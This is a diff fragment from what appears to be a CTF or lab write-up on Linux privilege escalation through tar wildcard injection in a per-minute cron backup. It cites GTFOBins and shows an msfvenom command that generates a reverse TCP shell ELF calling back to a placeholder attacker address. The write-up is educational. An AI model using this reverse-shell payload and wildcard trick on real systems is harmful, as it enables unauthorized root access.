@@ -853,11 +853,11 @@ cat /usr/local/bin/compress.sh
 
 ![image](https://user-images.githubusercontent.com/14150485/172453181-b97b7c49-a00e-4d5c-9328-a28fdca19eec.png)
 
-The `tar` command appears to run with a wildcard signified by the asterisk symbol `*`, that can be exploited if not used properly. According to the `crontab` information, it seems that a backup of the `/home/user/` folder is being made every minute.
+The `tar` command appears to run with a wildcard signified by the asterisk symbol `*`, that can be exploited if not used properly. According to the `crontab` information, it seems that a backup of the `/home/user/` folder is being made every minute. Researching `tar` at https://gtfobins.github.io/gtfobins/tar/ it looks like we can use its command options to spawn an interactive system shell!
 
 <br/>
 
-As instructed, let's create a `.elf` reverse shell using `msfvenon`.
+As instructed, let's create a `.elf` reverse shell using `msfvenon` which we will execute as a `tar` informative option later on.
 
 ```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -f elf -o shell.elf
